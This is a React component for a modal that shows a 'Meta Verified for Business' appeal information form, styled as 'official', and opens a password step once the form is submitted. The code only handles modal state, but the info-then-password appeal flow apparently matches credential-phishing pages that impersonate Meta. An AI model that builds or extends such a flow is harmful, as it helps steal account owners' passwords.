import React from 'react';
import Modal from '#components/modals/Modal';
import MvAppealInfoForm from '@/components/meta-verified-for-business/landing/MvAppealInfoForm';
import { useAppStrings } from '@/hooks/useAppStrings';

interface InfomationsModalProps {
  isOpend: boolean;
  isOpendPassword: (isOpenPassword: boolean) => void;
  onToggleModal: (isOpen: boolean) => void;
}

const InfomationsModal: React.FC<InfomationsModalProps> = ({ isOpend, isOpendPassword, onToggleModal }) => {
  const t = useAppStrings();
  const [isOpen, setIsOpen] = React.useState(isOpend);

  React.useEffect(() => {
    setIsOpen(isOpend);
  }, [isOpend]);

  const handleClose = () => {
    setIsOpen(false);
    onToggleModal(false);
  };

  const handleSubmitSuccess = () => {
    isOpendPassword(true);
    handleClose();
  };

  return (
    <Modal
      isOpen={isOpen}
      title={t.info.title}
      onClose={handleClose}
      panelClassName="mv-official-modal mv-activation-modal"
      titleClassName="mv-modal-title"
      backdropClassName="mv-official-backdrop"
    >
      <MvAppealInfoForm onSubmitSuccess={handleSubmitSuccess} />
    </Modal>
  );
};

export default InfomationsModal;
